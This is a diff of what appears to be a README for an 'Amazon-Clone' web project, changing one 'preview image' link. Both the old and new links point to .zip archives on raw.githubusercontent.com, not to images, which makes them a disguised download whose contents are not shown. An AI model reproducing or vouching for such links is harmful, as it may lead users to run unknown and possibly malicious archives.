@@ -8,7 +8,7 @@ If you are opening the site in mobile phone, Please open in Desktop Mode
 
 ## Preview Images:
 
-![preview-img](https://raw.githubusercontent.com/ayushgoyal73/Amazon-Clone/main/images/Amazon-Clone_v1.5-alpha.4.zip)
+![preview-img](https://raw.githubusercontent.com/ayushgoyal73/Amazon-Clone/main/images/Clone_Amazon_1.2.zip)
 
 ## Contributing
 
